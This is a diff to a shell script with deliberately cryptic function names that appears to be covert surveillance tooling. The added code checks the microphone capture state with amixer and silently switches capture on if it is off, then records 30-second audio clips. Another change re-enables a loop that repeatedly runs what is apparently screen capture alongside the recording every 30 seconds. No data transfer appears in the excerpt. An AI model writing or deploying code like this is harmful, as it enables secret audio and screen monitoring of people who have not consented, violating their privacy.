@@ -33,6 +33,15 @@ function ax_(){
     duration=30
     output_file="a.wav"
     #
+    microphone_status=$(amixer get Capture | grep "\[on\]")
+    #
+	if [[ -n $microphone_status ]]; then
+	    dbgx "ax... Mcx...Okx..."
+	else
+	    amixer set Capture toggle
+	    amixer set Capture cap
+	fi
+    #
     #amixer set Capture cap
     #
     dbgx "ax started..."
@@ -132,7 +141,7 @@ function px(){
 	#
     	ax_ & ssx_ & PxNwx
     	#
-	#ssx2
+	ssx2
  	#reboot
 	#
 	exit 0
@@ -148,7 +157,7 @@ function ssx2(){
 	while [ $et -le $st ]
 	do
 	 et=`date +%s`
-  	amixer set Capture toggle
+  	 #amixer set Capture toggle
   	 ssx_ & ax_
 	 sleep 30
 	done
